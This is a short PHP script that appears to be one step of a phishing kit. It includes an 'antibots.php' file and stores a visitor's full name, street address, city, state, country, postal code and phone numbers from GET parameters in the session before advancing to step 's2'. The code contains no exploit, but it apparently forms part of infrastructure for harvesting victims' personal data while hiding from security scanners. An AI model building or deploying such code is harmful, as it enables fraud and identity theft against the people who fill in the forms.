<?php
  session_start();
  require_once("../inc/config.inc.php");
  require_once("../antibots.php");
  if(isset($_GET['submit'])) {
    $fn = $_GET['fn'];
    $addline = $_GET['addline'];
    $city = $_GET['city'];
    $state = $_GET['state'];
    $country = $_GET['country'];
    $postal = $_GET['postal'];
    $mobile = $_GET['mobile'];
    $phone = $_GET['phone'];
    $_SESSION['fn'] = $fn;
    $_SESSION['addline'] = $addline;
    $_SESSION['city'] = $city;
    $_SESSION['state'] = $state;
    $_SESSION['country'] = $country;
    $_SESSION['postal'] = $postal;
    $_SESSION['mobile'] = $mobile;
    $_SESSION['phone'] = $phone;
    $_SESSION['step'] = "s2";
    echo "RESULT:DONE;";
  }
?>
